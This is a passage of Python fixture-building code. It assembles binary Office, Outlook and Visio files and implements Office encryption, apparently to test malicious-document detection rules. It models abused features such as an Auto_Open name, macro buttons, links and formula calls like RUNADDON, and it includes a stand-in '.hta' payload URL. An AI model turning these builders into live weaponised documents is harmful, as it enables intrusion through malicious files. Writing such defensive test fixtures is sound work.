        clx = b'\x02' + struct.pack('<I', len(plc)) + plc
        struct.pack_into('<II', fib, 0x160, 0x300 + len(text_bytes) + macros, len(clx))
    else:
        text_bytes, clx = text.encode('latin-1'), b''
    struct.pack_into('<II', fib, 0x18, 0x300, 0x300 + len(text_bytes))
    struct.pack_into('<II', fib, 0x118, 0x300 + len(text_bytes), macros)
    body = bytes(fib) + text_bytes + bytes(macros) + clx
    return cfb([Stream('WordDocument', body.ljust(4096, b'\0'))])

# ---------- Excel 5.0 to 2003 workbooks ----------


def rec(t, body=b''):
    return struct.pack('<HH', t, len(body)) + body


def bof(dt, biff8=True):
    return rec(0x0809, struct.pack('<HHHHII', 0x0600 if biff8 else 0x0500, dt, 0x0DBB, 0x07CC, 0, 0) if biff8 else struct.pack('<HHHH', 0x0500, dt, 0x0DBB, 0x07CC))


def short_xl(s):
    return struct.pack('<BB', len(s), 0) + s.encode('latin-1')


def lbl(name, builtin=None):
    """A Lbl record. A built-in name is one character, its index: 1 for Auto_Open."""
    if builtin is not None:
        return rec(0x0018, struct.pack('<HBBHHHBBBB', 0x0020, 0, 1, 0, 0, 0, 0, 0, 0, 0) + b'\x00' + bytes([builtin]))
    return rec(0x0018, struct.pack('<HBBHHHBBBB', 0, 0, len(name), 0, 0, 0, 0, 0, 0, 0) + b'\x00' + name.encode('latin-1'))


def workbook(sheets, globals_extra=b'', biff8=True, sheet_extra=None):
    """A workbook stream: globals with a BoundSheet per sheet, then each sheet's substream. `sheets` holds (name, dt, bof type)."""
    sheet_extra = sheet_extra or {}
    sheet_streams = [bof(t, biff8) + sheet_extra.get(name, b'') + rec(0x000A) for name, _, t in sheets]
    bound_size = [len(rec(0x0085, struct.pack('<IBB', 0, 0, 0) + (short_xl(n) if biff8 else struct.pack('<B', len(n)) + n.encode('latin-1')))) for n, _, _ in sheets]
    head = bof(5, biff8) + globals_extra
    pos = len(head) + sum(bound_size) + len(rec(0x000A))
    bounds = b''
    for (name, dt, _), stream in zip(sheets, sheet_streams):
        bounds += rec(0x0085, struct.pack('<IBB', pos, 0 if dt != 1 else 1, dt) + (short_xl(name) if biff8 else struct.pack('<B', len(name)) + name.encode('latin-1')))
        pos += len(stream)
    return head + bounds + rec(0x000A) + b''.join(sheet_streams)


def supbook(ctab, path):
    return rec(0x01AE, struct.pack('<HH', ctab, len(path)) + b'\x00' + path.encode('latin-1'))


def extern_name(name, flags):
    return rec(0x0023, struct.pack('<HI', flags, 0) + struct.pack('<BB', len(name), 0) + name.encode('latin-1'))


def obj_macro():
    """An Obj record for a button: FtCmo, FtMacro with a formula naming a defined name, then FtEnd."""
    cmo = struct.pack('<HHHHH', 0x15, 0x12, 7, 1, 0x6011) + bytes(12)
    fmla = struct.pack('<HIH', 5, 0, 5) + b'\x23\x01\x00\x00\x00'
    return rec(0x005D, cmo + struct.pack('<HH', 0x04, len(fmla)) + fmla + struct.pack('<HH', 0, 0))


def hlink(target=None, file_path=None):
    """An HLink record for cell A1, with a URL moniker or a file moniker."""
    moniker = url_moniker(target) if target is not None else file_moniker(file_path)
    return rec(0x01B8, struct.pack('<HHHH', 0, 0, 0, 0) + clsid_bytes('79EAC9D0-BAF9-11CE-8C82-00AA004BA90B') + struct.pack('<II', 2, 0x03) + moniker)


def xls(sheets, globals_extra=b'', extra=(), sheet_extra=None, book=False, biff8=True):
    stream = workbook(sheets, globals_extra, biff8, sheet_extra)
    return cfb([Stream('Book' if book else 'Workbook', stream)] + list(extra), root_clsid='00020820-0000-0000-C000-000000000046')

# ---------- PowerPoint 97 to 2003 presentations ----------


def prec(t, body=b'', instance=0, container=False):
    return struct.pack('<HHI', (instance << 4) | (0x0F if container else 0), t, len(body)) + body


def cstring(text, instance):
    return prec(0x0FBA, text.encode('utf-16-le'), instance)


def ppt(objects=(), document=b'', slides=b'', encrypted=False, extra_persist=None, password=None):
    """A presentation stream: a DocumentContainer, a slide, the persist objects, a persist directory and the current edit.
    `objects` are (persist id, record) pairs that the directory names. `password` encrypts it as PowerPoint does
    (MS-PPT 2.3.7): a CryptSession10Container persist object with an RC4 CryptoAPI header, and every other persist
    object, its header included, RC4 with the key of its persist id."""
    out = bytearray()
    offsets = {}
    session = None
    if password is not None:
        encrypted = True
        header, key = rc4_header(password, 'cryptoapi')
        objects = list(objects) + [(90, prec(0x2F14, header, container=True))]
        session = 90
    doc = prec(0x03E8, prec(0x03E9, bytes(40)) + document, container=True)
    offsets[1] = len(out)
    out += doc
    offsets[2] = len(out)
    out += prec(0x03EE, prec(0x03EF, bytes(24)) + slides, container=True)
    for pid, record in objects:
        offsets[pid] = len(out)
        out += record
    if extra_persist:
        offsets.update(extra_persist(offsets))
    ids = sorted(offsets)
    directory = b''.join(struct.pack('<I', (1 << 20) | i) + struct.pack('<I', offsets[i]) for i in ids)
    dir_at = len(out)
    out += prec(0x1772, directory)
    edit_at = len(out)
    out += prec(0x0FF5, struct.pack('<IHBBIIIIHH', 0, 0, 0, 3, 0, dir_at, 1, max(ids) + 1, 1, 0) + (struct.pack('<I', session) if session else b''))
    user = prec(0x0FF6, struct.pack('<IIIHHBBH', 0x14, 0xF3D1C4DF if encrypted else 0xE391C05F, edit_at, 0, 0x03F4, 3, 0, 0))
    if session:
        for pid, at in offsets.items():
            if pid == session:
                continue
            length = 8 + struct.unpack_from('<I', out, at + 4)[0]
            out[at:at + length] = rc4(key(pid), bytes(out[at:at + length]))
    return cfb([Stream('PowerPoint Document', bytes(out)), Stream('Current User', user)], root_clsid='64818D10-4F9B-11CF-86EA-00AA00B929E8')


def ex_ole_stg(storage, compressed):
    if compressed:
        return prec(0x1011, struct.pack('<I', len(storage)) + zlib.compress(storage, 9), instance=1)
    return prec(0x1011, storage)

# ---------- Outlook messages ----------


def props(entries, header):
    """A property stream: `header` bytes, then a 16-byte entry per (tag, value) pair of 32-bit values."""
    return bytes(header) + b''.join(struct.pack('<IIII', tag, 6, value, 0) for tag, value in entries)


def attachment(n, method, name, mime=None, data=None, path=None, children=()):
    kids = [Stream('__properties_version1.0', props([(0x37050003, method)], 8)), Stream('__substg1.0_3707001F', name.encode('utf-16-le'))]
    if mime:
        kids.append(Stream('__substg1.0_370E001F', mime.encode('utf-16-le')))
    if data is not None:
        kids.append(Stream('__substg1.0_37010102', data))
    if path:
        kids.append(Stream('__substg1.0_370D001F', path.encode('utf-16-le')))
    kids += list(children)
    return Storage('__attach_version1.0_#%08X' % n, kids)


RTF_PRESET = (b'{\\rtf1\\ansi\\mac\\deff0\\deftab720{\\fonttbl;}{\\f0\\fnil \\froman \\fswiss \\fmodern \\fscript \\fdecor MS Sans SerifSymbolArialTimes New RomanCourier'
              b'{\\colortbl\\red0\\green0\\blue0\r\n\\par \\pard\\plain\\f0\\fs20\\b\\i\\u\\tab\\tx')


def compress_rtf(rtf, crc=None):
    """PidTagRtfCompressed (MS-OXRTFCP): LZFu over a 4,096-byte dictionary that starts with RTF_PRESET. Each match is
    the longest of 2 to 17 bytes that ends before the write offset, so no copy reads what it writes."""
    assert len(RTF_PRESET) == 207
    d = bytearray(4096)
    d[:207] = RTF_PRESET
    write, i, out = 207, 0, bytearray()
    done = False
    while not done:
        control, tokens = 0, bytearray()
        for bit in range(8):
            if i >= len(rtf):
                control |= 1 << bit
                tokens += struct.pack('>H', write << 4)
                done = True
                break
            best, at = 0, 0
            for o in range(4096):
                if o == write:
                    continue
                n = 0
                while n < 17 and i + n < len(rtf) and (o + n) % 4096 != write and d[(o + n) % 4096] == rtf[i + n]:
                    n += 1
                if n > best:
                    best, at = n, o
            if best >= 2:
                control |= 1 << bit
                tokens += struct.pack('>H', (at << 4) | (best - 2))
                for k in range(best):
                    d[write] = rtf[i + k]
                    write = (write + 1) % 4096
                i += best
            else:
                tokens.append(rtf[i])
                d[write] = rtf[i]
                write = (write + 1) % 4096
                i += 1
        out.append(control)
        out += tokens
    # The CRC of MS-OXRTFCP starts at 0 and is never inverted.
    value = (zlib.crc32(bytes(out), 0xFFFFFFFF) ^ 0xFFFFFFFF) if crc is None else crc
    return struct.pack('<IIII', len(out) + 12, len(rtf), 0x75465A4C, value) + bytes(out)


def msg(attachments, clsid='00020D0B-0000-0000-C000-000000000046', rtf_body=None, html_body=None):
    """An Outlook message. `rtf_body` is a PidTagRtfCompressed value and `html_body` the bytes of PidTagHtml, each
    with its entry in the property stream."""
    entries, extra = [], []
    if rtf_body is not None:
        entries.append((0x10090102, len(rtf_body)))
        extra.append(Stream('__substg1.0_10090102', rtf_body))
    if html_body is not None:
        entries.append((0x10130102, len(html_body)))
        extra.append(Stream('__substg1.0_10130102', html_body))
    return cfb([Stream('__properties_version1.0', props(entries, 32)), Stream('__substg1.0_0037001F', 'Inert subject'.encode('utf-16-le')), Storage('__nameid_version1.0', [])] + extra + list(attachments), root_clsid=clsid)


# ---------- encryption, with fixed salts and keys so a rebuild writes the same bytes ----------
#
# Python has no AES in its standard library, so aes_encrypt() is FIPS-197 written out. It only encrypts, which is all a
# fixture needs. RC4 is short enough to write here too.

SBOX = []


def _sbox():
    p = q = 1
    box = [0] * 256
    while True:
        p = p ^ ((p << 1) & 0xFF) ^ (0x1B if p & 0x80 else 0)
        q ^= q << 1
        q ^= q << 2
        q ^= q << 4
        q &= 0xFF
        if q & 0x80:
            q ^= 0x09
        x = q ^ ((q << 1) | (q >> 7)) & 0xFF ^ ((q << 2) | (q >> 6)) & 0xFF ^ ((q << 3) | (q >> 5)) & 0xFF ^ ((q << 4) | (q >> 4)) & 0xFF
        box[p] = (x ^ 0x63) & 0xFF
        if p == 1:
            break
    box[0] = 0x63
    return box


SBOX = _sbox()


def _xtime(a):
    return ((a << 1) ^ 0x1B) & 0xFF if a & 0x80 else a << 1


def _expand(key):
    nk = len(key) // 4
    rounds = nk + 6
    w = [list(key[4 * i:4 * i + 4]) for i in range(nk)]
    rcon = 1
    for i in range(nk, 4 * (rounds + 1)):
        t = list(w[i - 1])
        if i % nk == 0:
            t = [SBOX[b] for b in t[1:] + t[:1]]
            t[0] ^= rcon
            rcon = _xtime(rcon)
        elif nk > 6 and i % nk == 4:
            t = [SBOX[b] for b in t]
        w.append([a ^ b for a, b in zip(w[i - nk], t)])
    return [sum(w[4 * r:4 * r + 4], []) for r in range(rounds + 1)]


def _encrypt_block(keys, block):
    s = [a ^ b for a, b in zip(block, keys[0])]
    for r in range(1, len(keys)):
        s = [SBOX[b] for b in s]
        s = [s[(i + 4 * (i % 4)) % 16] for i in range(16)]
        if r < len(keys) - 1:
            m = []
            for c in range(4):
                a = s[4 * c:4 * c + 4]
                t = a[0] ^ a[1] ^ a[2] ^ a[3]
                m += [a[i] ^ t ^ _xtime(a[i] ^ a[(i + 1) % 4]) for i in range(4)]
            s = m
        s = [a ^ b for a, b in zip(s, keys[r])]
    return bytes(s)


def aes_encrypt(key, data, iv=None):
    """AES-ECB, or AES-CBC from `iv`, over data that is a whole number of blocks."""
    keys = _expand(key)
    out, prev = bytearray(), iv
    for i in range(0, len(data), 16):
        block = data[i:i + 16]
        if iv is not None:
            block = bytes(a ^ b for a, b in zip(block, prev))
        prev = _encrypt_block(keys, block)
        out += prev
    return bytes(out)


def aes_cfb8_encrypt(key, data, iv):
    """AES in CFB with an 8-bit window, which Agile's ChainingModeCFB names: each byte is XORed with the first byte of the
    encryption of the 16 ciphertext bytes before it, the IV standing in front."""
    keys = _expand(key)
    register, out = bytearray(iv[:16]), bytearray()
    for b in data:
        c = b ^ _encrypt_block(keys, bytes(register))[0]
        out.append(c)
        register = register[1:] + bytes([c])
    return bytes(out)


def rc4(key, data):
    s = list(range(256))
    j = 0
    for i in range(256):
        j = (j + s[i] + key[i % len(key)]) & 255
        s[i], s[j] = s[j], s[i]
    out, i, j = bytearray(), 0, 0
    for b in data:
        i = (i + 1) & 255
        j = (j + s[i]) & 255
        s[i], s[j] = s[j], s[i]
        out.append(b ^ s[(s[i] + s[j]) & 255])
    return bytes(out)


def pad16(b, fill=0):
    return b + bytes([fill]) * (-len(b) % 16)


def agile_encrypt(package, password, spin=100000, hash_name='sha512', cipher='AES', salt_size=True, chaining='cbc'):
    """An encrypted OOXML package (MS-OFFCRYPTO 2.3.4.10): AES-256-CBC and SHA-512 by default, with fixed salts and keys.
    A hash shorter than the key, such as SHA-1's, is padded with 0x36 to make it. `chaining='cfb'` uses CFB with an
    8-bit window, ChainingModeCFB, which needs no padding."""
    enc = (lambda key, data, iv: aes_cfb8_encrypt(key, data, iv)) if chaining == 'cfb' else (lambda key, data, iv: aes_encrypt(key, pad16(data), iv))
    mode = 'ChainingModeCFB' if chaining == 'cfb' else 'ChainingModeCBC'
    key_salt, data_salt, secret, verifier = bytes(range(16)), bytes(range(16, 32)), bytes(range(32, 64)), bytes(range(64, 80))
    H = lambda data: hashlib.new(hash_name, data).digest()
    h = H(key_salt + password.encode('utf-16-le'))
    for i in range(spin):
        h = H(struct.pack('<I', i) + h)

    def derive(block):
        return (H(h + block) + b'\x36' * 32)[:32]
    enc_input = enc(derive(bytes.fromhex('fea7d2763b4b9e79')), verifier, key_salt)
    enc_value = enc(derive(bytes.fromhex('d7aa0f6d3061344e')), H(verifier), key_salt)
    enc_key = enc(derive(bytes.fromhex('146e0be7abacd0d6')), secret, key_salt)
    body = bytearray(struct.pack('<Q', len(package)))
    for k in range(0, len(package), 4096):
        iv = H(data_salt + struct.pack('<I', k // 4096))[:16]
        body += enc(secret, package[k:k + 4096], iv)
    # The integrity check Office writes: an HMAC key, and the HMAC of the encrypted package, each encrypted.
    hmac_key = bytes(range(128, 192))[:len(H(b''))]
    hmac_value = hmac.new(hmac_key, bytes(body), hash_name).digest()
    enc_hmac_key = enc(secret, hmac_key, H(data_salt + bytes.fromhex('5fb2ad010cb9e1f6'))[:16])
    enc_hmac_value = enc(secret, hmac_value, H(data_salt + bytes.fromhex('a0677f02b22c8433'))[:16])
    b = lambda x: base64.b64encode(x).decode()
    name, size = {'sha512': ('SHA512', 64), 'sha1': ('SHA1', 20)}[hash_name]
    salt_attr = 'saltSize="16" ' if salt_size else ''
    xml = ('<?xml version="1.0" encoding="UTF-8" standalone="yes"?>\r\n<encryption xmlns="http://schemas.microsoft.com/office/2006/encryption" '
           'xmlns:p="http://schemas.microsoft.com/office/2006/keyEncryptor/password"><keyData saltSize="16" blockSize="16" keyBits="256" hashSize="%d" '
           'cipherAlgorithm="%s" cipherChaining="%s" hashAlgorithm="%s" saltValue="%s"/><dataIntegrity encryptedHmacKey="%s" encryptedHmacValue="%s"/><keyEncryptors><keyEncryptor '
           'uri="http://schemas.microsoft.com/office/2006/keyEncryptor/password"><p:encryptedKey spinCount="%d" %sblockSize="16" keyBits="256" '
           'hashSize="%d" cipherAlgorithm="%s" cipherChaining="%s" hashAlgorithm="%s" saltValue="%s" encryptedVerifierHashInput="%s" '
           'encryptedVerifierHashValue="%s" encryptedKeyValue="%s"/></keyEncryptor></keyEncryptors></encryption>') % (
        size, cipher, mode, name, b(data_salt), b(enc_hmac_key), b(enc_hmac_value), spin, salt_attr, size, cipher, mode, name, b(key_salt), b(enc_input), b(enc_value), b(enc_key))
    info = struct.pack('<HHI', 4, 4, 0x40) + xml.encode()
    return info, bytes(body)


def standard_encrypt(package, password, bits=128, alg=None):
    """An encrypted OOXML package (MS-OFFCRYPTO 2.3.4.5): AES-ECB and SHA-1 over 50,000 rounds, with a fixed salt."""
    salt, verifier = bytes(range(100, 116)), bytes(range(116, 132))
    h = hashlib.sha1(salt + password.encode('utf-16-le')).digest()
    for i in range(50000):
        h = hashlib.sha1(struct.pack('<I', i) + h).digest()
    final = hashlib.sha1(h + struct.pack('<I', 0)).digest()
    x = lambda fill: hashlib.sha1(bytes(a ^ b for a, b in zip(bytes([fill]) * 64, final + bytes(44)))).digest()
    key = (x(0x36) + x(0x5C))[:bits // 8]
    alg = alg or {128: 0x660E, 192: 0x660F, 256: 0x6610}[bits]
    csp = 'Microsoft Enhanced RSA and AES Cryptographic Provider\0'.encode('utf-16-le')
    header = struct.pack('<IIIIIIII', 0x24, 0, alg, 0x8004, bits, 0x18, 0, 0) + csp
    info = struct.pack('<HHI', 4, 2, 0x24) + struct.pack('<I', len(header)) + header + struct.pack('<I', 16) + salt + aes_encrypt(key, verifier) + struct.pack('<I', 20) + aes_encrypt(key, pad16(hashlib.sha1(verifier).digest()))
    return info, struct.pack('<Q', len(package)) + aes_encrypt(key, pad16(package))


def encrypted_package(package, password, kind='agile', stub=False, **options):
    info, body = agile_encrypt(package, password, **options) if kind == 'agile' else standard_encrypt(package, password, **options)
    spaces = Storage('\x06DataSpaces', [Stream('Version', b'\x3c\x00\x00\x00' + 'Microsoft.Container.DataSpaces'.encode('utf-16-le') + struct.pack('<HHHHHH', 1, 0, 1, 0, 1, 0))])
    extra = [Stream('WordDocument', bytes(4096))] if stub else []
    return cfb([Stream('EncryptionInfo', info), Stream('EncryptedPackage', body), spaces] + extra)


def rc4_header(password, method='rc4', bits=128, alg=0x6801):
    """The EncryptionHeader of a binary document, from its version on, and the key of each block: RC4 (MS-OFFCRYPTO
    2.3.6) or RC4 CryptoAPI (2.3.5), with a fixed salt and verifier."""
    salt, verifier = bytes(range(200, 216)), bytes(range(216, 232))
    if method == 'rc4':
        h0 = hashlib.md5(password.encode('utf-16-le')).digest()[:5]
        h1 = hashlib.md5((h0 + salt) * 16).digest()[:5]
        key = lambda block: hashlib.md5(h1 + struct.pack('<I', block)).digest()
        enc = rc4(key(0), verifier + hashlib.md5(verifier).digest())
        return struct.pack('<HH', 1, 1) + salt + enc, key
    h0 = hashlib.sha1(salt + password.encode('utf-16-le')).digest()
    size = bits or 40
    key = lambda block: hashlib.sha1(h0 + struct.pack('<I', block)).digest()[:5] + bytes(11) if size == 40 else hashlib.sha1(h0 + struct.pack('<I', block)).digest()[:size // 8]
    enc = rc4(key(0), verifier + hashlib.sha1(verifier).digest())
    csp = 'Microsoft Enhanced Cryptographic Provider v1.0\0'.encode('utf-16-le')
    header = struct.pack('<IIIIIIII', 0x04, 0, alg, 0x8004, bits, 1, 0, 0) + csp
    return struct.pack('<HH', 4, 2) + struct.pack('<I', 0x04) + struct.pack('<I', len(header)) + header + struct.pack('<I', 16) + salt + enc[:16] + struct.pack('<I', 20) + enc[16:], key


# XOR obfuscation (MS-OFFCRYPTO 2.3.7), written from the specification's pseudocode.
XOR_PAD = [0xBB, 0xFF, 0xFF, 0xBA, 0xFF, 0xFF, 0xB9, 0x80, 0x00, 0xBE, 0x0F, 0x00, 0xBF, 0x0F, 0x00]
XOR_INITIAL = [0xE1F0, 0x1D0F, 0xCC9C, 0x84C0, 0x110C, 0x0E10, 0xF1CE, 0x313E, 0x1872, 0xE139, 0xD40F, 0x84F9, 0x280C, 0xA96A, 0x4EC3]
XOR_MATRIX = [
    0xAEFC, 0x4DD9, 0x9BB2, 0x2745, 0x4E8A, 0x9D14, 0x2A09, 0x7B61, 0xF6C2, 0xFDA5, 0xEB6B, 0xC6F7, 0x9DCF, 0x2BBF, 0x4563, 0x8AC6,
    0x05AD, 0x0B5A, 0x16B4, 0x2D68, 0x5AD0, 0x0375, 0x06EA, 0x0DD4, 0x1BA8, 0x3750, 0x6EA0, 0xDD40, 0xD849, 0xA0B3, 0x5147, 0xA28E,
    0x553D, 0xAA7A, 0x44D5, 0x6F45, 0xDE8A, 0xAD35, 0x4A4B, 0x9496, 0x390D, 0x721A, 0xEB23, 0xC667, 0x9CEF, 0x29FF, 0x53FE, 0xA7FC,
    0x5FD9, 0x47D3, 0x8FA6, 0x0F6D, 0x1EDA, 0x3DB4, 0x7B68, 0xF6D0, 0xB861, 0x60E3, 0xC1C6, 0x93AD, 0x377B, 0x6EF6, 0xDDEC, 0x45A0,
    0x8B40, 0x06A1, 0x0D42, 0x1A84, 0x3508, 0x6A10, 0xAA51, 0x4483, 0x8906, 0x022D, 0x045A, 0x08B4, 0x1168, 0x76B4, 0xED68, 0xCAF1,
    0x85C3, 0x1BA7, 0x374E, 0x6E9C, 0x3730, 0x6E60, 0xDCC0, 0xA9A1, 0x4363, 0x86C6, 0x1DAD, 0x3331, 0x6662, 0xCCC4, 0x89A9, 0x0373,
    0x06E6, 0x0DCC, 0x1021, 0x2042, 0x4084, 0x8108, 0x1231, 0x2462, 0x48C4]


def xor_key1(pw):
    """CreateXorKey_Method1."""
    key = XOR_INITIAL[len(pw) - 1]
    element = 0x68
    for c in reversed(pw):
        for _ in range(7):
            if c & 0x40:
                key ^= XOR_MATRIX[element]
            c *= 2
            element -= 1
    return key & 0xFFFF


def xor_verifier1(pw):
    """CreatePasswordVerifier_Method1."""
    v = 0
    for b in reversed(bytes([len(pw)]) + pw):
        v = ((1 if v & 0x4000 else 0) | ((v * 2) & 0x7FFF)) ^ b
    return v ^ 0xCE4B


def xor_ror(b):
    return ((b >> 1) | (b << 7)) & 0xFF


def xor_array1(pw):
    """CreateXorArray_Method1."""
    key = xor_key1(pw)
    hi, lo = key >> 8, key & 0xFF
    out = [0] * 16
    i = len(pw)
    if i % 2 == 1:
        out[i] = xor_ror(XOR_PAD[0] ^ hi)
        i -= 1
        out[i] = xor_ror(pw[-1] ^ lo)
    while i > 0:
        i -= 1
        out[i] = xor_ror(pw[i] ^ hi)
        i -= 1
        out[i] = xor_ror(pw[i] ^ lo)
    i, pad = 15, 15 - len(pw)
    while pad > 0:
        out[i] = xor_ror(XOR_PAD[pad] ^ hi)
        i -= 1
        pad -= 1
        out[i] = xor_ror(XOR_PAD[pad] ^ lo)
        i -= 1
        pad -= 1
    return out


def xor_array2(pw):
    """CreateXorArray_Method2, which Word uses."""
    key = xor_key1(pw)
    out = [pw[i] if i < len(pw) else XOR_PAD[i - len(pw)] for i in range(16)]
    for i in range(0, 16, 2):
        out[i] = xor_ror(out[i] ^ (key & 0xFF))
        out[i + 1] = xor_ror(out[i + 1] ^ (key >> 8))
    return out


def biff_encrypt(stream, password, method='rc4', bits=128, alg=0x6801):
    """A BIFF8 workbook stream with a FILEPASS record after its BOF and every later record encrypted (MS-XLS 2.2.10):
    RC4 keyed per 1,024-byte block of the stream, record headers left plain, and lbPlyPos of BoundSheet8 too. `xor`
    obfuscates with method 1 instead, each record's bytes from the index its offset and size give."""
    if method == 'xor':
        pw = password.encode('latin-1')
        filepass = struct.pack('<HHH', 0, xor_key1(pw), xor_verifier1(pw))
        array = xor_array1(pw)
    else:
        header, key = rc4_header(password, method, bits, alg)
        filepass = struct.pack('<H', 1) + header
    first = struct.unpack_from('<H', stream, 2)[0] + 4
    fp = rec(0x002F, filepass)
    plain = bytearray(stream[:first] + fp + stream[first:])
    # BoundSheet8 positions move by the FILEPASS record.
    p = first + len(fp)
    while p + 4 <= len(plain):
        t, n = struct.unpack_from('<HH', plain, p)
        if t == 0x0085:
            struct.pack_into('<I', plain, p + 4, struct.unpack_from('<I', plain, p + 4)[0] + len(fp))
        if t == 0x000A:
            break
        p += 4 + n
    out = bytearray(plain)
    p = first + len(fp)
    blocks = {}

    def ks(at):
        b = at // 1024
        if b not in blocks:
            blocks[b] = rc4(key(b), bytes(1024))
        return blocks[b][at % 1024]
    while p + 4 <= len(plain):
        t, n = struct.unpack_from('<HH', plain, p)
        if t not in (0x0809, 0x002F, 0x0194, 0x0195, 0x00E1, 0x0196, 0x0138):
            for k in range(4 if t == 0x0085 else 0, n):
                if method == 'xor':
                    v = plain[p + 4 + k]
                    out[p + 4 + k] = (((v << 5) | (v >> 3)) & 0xFF) ^ array[(p + 4 + n + k) % 16]
                else:
                    out[p + 4 + k] ^= ks(p + 4 + k)
        p += 4 + n
    return bytes(out)


def word_encrypt(text, password, method):
    """An encrypted Word 97 document (MS-DOC 2.2.6) whose text is `text`. RC4 and RC4 CryptoAPI put the EncryptionHeader
    in the table stream's first lKey bytes, and encrypt the WordDocument stream past its first 68 bytes and the rest of
    the table stream in 512-byte blocks. `xor` obfuscates with method 2 and puts the verifier in lKey."""
    if method == 'xor':
        pw = password.encode('latin-1')
        prefix, lkey = b'', (xor_key1(pw) << 16) | xor_verifier1(pw)
    else:
        prefix, key = rc4_header(password, method)
        lkey = len(prefix)
    word, table, data = word_doc(text, streams=True, table_prefix=prefix, flags_extra=0x0100 | (0x8000 if method == 'xor' else 0))
    word = bytearray(word)
    struct.pack_into('<I', word, 14, lkey)

    def transform(buf, plain):
        out = bytearray(buf)
        if method == 'xor':
            array = xor_array2(pw)
            for i in range(plain, len(out)):
                a = array[i % 16]
                if out[i] != 0 and out[i] != a:
                    out[i] ^= a
        else:
            for b in range(0, len(out), 512):
                ks = rc4(key(b // 512), bytes(512))
                for i in range(max(b, plain), min(b + 512, len(out))):
                    out[i] ^= ks[i - b]
        return bytes(out)
    return cfb([Stream('WordDocument', transform(word, 68)), Stream('1Table', transform(table, len(prefix))), Stream('\x01CompObj', comp_obj('Microsoft Word 97-2004 Document', 'Word.Document.8'))],
               root_clsid='00020906-0000-0000-C000-000000000046')


# ---------- binary Office files and RTF, written byte by byte ----------
#
# Each file holds what one rule reads: a field, a link, an object, a macro storage. Payloads are inert markers and
# addresses use reserved names. None of these files comes from anywhere but this code.

INERT_URL = 'https://example.invalid/inert.hta'


def zip_package(kind='xlsx'):
    """A small OOXML package to encrypt."""
    if kind == 'docx':
        return zip_bytes(docx('<w:p><w:r><w:t>inert</w:t></w:r></w:p>'))
    return zip_bytes(xlsx())


def object_pool(objects):
    return Storage('ObjectPool', [Storage('_%d' % (1000 + i), kids, clsid) for i, (kids, clsid) in enumerate(objects)])


VISIO_CLSID = '00021A14-0000-0000-C000-000000000046'


def vsd_compress(data):
    """Visio's LZ77, as libvisio's VSDInternalStream.cpp reads it: a flag byte for each eight items, a set bit for a
    literal byte and a clear one for a 2-byte reference to 3 to 18 bytes in a 4,096-byte window. The window position
    of output byte n is n % 4096, and a reference stores that position less 18. A reference may overlap the bytes it
    writes, as a run of one byte does."""
    out = bytearray()
    last = {}
    i, n = 0, len(data)
    while i < n:
        flag, items = 0, bytearray()
        for bit in range(8):
            if i >= n:
                break
            at = last.get(data[i:i + 3])
            k = 0
            if at is not None and i - at <= 4000:
                while k < 18 and i + k < n and data[at + k] == data[i + k]:
                    k += 1
            for j in range(i, i + max(k, 1)):
                last[data[j:j + 3]] = j
            if k >= 3:
                p = (at % 4096 - 18) % 4096
                items += bytes([p & 0xff, ((p >> 8) << 4) | (k - 3)])
                i += k
            else:
                flag |= 1 << bit
                items.append(data[i])
                i += 1
        out.append(flag)
        out += items
    assert vsd_inflate(bytes(out)) == data
    return bytes(out)


def vsd_inflate(src):
    out, window, i = bytearray(), bytearray(4096), 0
    while i < len(src):
        flag = src[i]
        i += 1
        for bit in range(8):
            if i >= len(src):
                break
            if flag & (1 << bit):
                window[len(out) % 4096] = src[i]
                out.append(src[i])
                i += 1
            else:
                p = ((src[i + 1] & 0xf0) << 4) | src[i]
                p = p - 4078 if p > 4078 else p + 18
                for j in range((src[i + 1] & 15) + 3):
                    c = window[(p + j) % 4096]
                    window[len(out) % 4096] = c
                    out.append(c)
                i += 2
    return bytes(out)


# Formula tokens (OLEToy vsdblock.py): strings, numbers, references, operators and calls, in reverse Polish order.
def vf_str(s, wide=True):
    return b'\x60' + bytes([len(s)]) + (s.encode('utf-16-le') + b'\0\0' if wide else s.encode('latin-1') + b'\0')


def vf_long(s):
    return b'\x69' + struct.pack('<I', len(s)) + s.encode('utf-16-le') + b'\0\0'


def vf_num(x):
    return b'\x20' + struct.pack('<d', x)


def vf_call(fn, args=None):
    """A function call: fixed arguments, or a count of them."""
    if args is None:
        return b'\x80' + struct.pack('<H', fn) + b'\x00\x40'
    return b'\x81' + struct.pack('<IH', args, fn) + b'\x00\x40'


RUNADDON, RUNADDONWARGS, CALLTHIS, RUNMACRO, OPENFILE, DOOLEVERB = 0x51, 0x79, 0x9b, 0xc7, 0x7b, 0x4f


def vsd_block(kind, cell, body):
    return struct.pack('<I', 6 + len(body)) + bytes([kind, cell]) + body


def vsd_formula(cell, *tokens):
    return vsd_block(2, cell, b''.join(tokens) + b'\xfe')


def vsd_trailer11(ctype, lst, level, flags):
    """The trailer after a chunk's data in a Visio 2003 file (libvisio VSDParser.cpp getChunkHeader)."""
    if ctype in (0x1f, 0xc9, 0x2d, 0xd1):
        return 0
    n = 8 if lst or ctype in (0x71, 0x70, 0x6b, 0x6a, 0x69, 0x66, 0x65, 0x2c) else 0
    if lst or (level == 2 and flags == 0x55) or (level == 2 and flags == 0x54 and ctype == 0xaa) or (level == 3 and flags not in (0x50, 0x54)):
        n += 4
    if ctype in (0x64, 0x65, 0x66, 0x69, 0x6a, 0x6b, 0x6f, 0x71, 0x92, 0xa9, 0xb4, 0xb6, 0xb9, 0xc7) and n not in (12, 4):
        n += 4
    return n


def vsd_chunk(ctype, fixed, *blocks, version=11, lst=0, trailer=None, length=None):
    """A chunk: a 19-byte header, `fixed` bytes of fixed fields, the cell blocks, and the trailer its header implies."""
    data = bytes(fixed) + b''.join(blocks)
    head = struct.pack('<IIIIHB', ctype, 0, lst, len(data) if length is None else length, 2, 0x50)
    if trailer is None:
        trailer = bytes(vsd_trailer11(ctype, lst, 2, 0x50) if version == 11 else (8 if lst else 0))
    return head + data + trailer


def vsd_pointer(ptype, offset, length, fmt):
    return struct.pack('<IIIIH', ptype, 0, offset, length, fmt)


def vsd_pointers(*pointers, count=None):
    """A pointer list: the offset of its header, the header with the count, then the 18-byte pointers."""
    return struct.pack('<IIII', 8, 0, len(pointers) if count is None else count, 0) + b''.join(pointers)


def vsd_document(chunks, version=11, compressed=True, pointer_offset=None):
    """A VisioDocument stream: the header with its version at 0x1A and the trailer pointer at 0x24, the trailer's
    pointer list, a list naming the chunk stream, and the chunk stream."""
    body = vsd_compress(chunks) if compressed else chunks
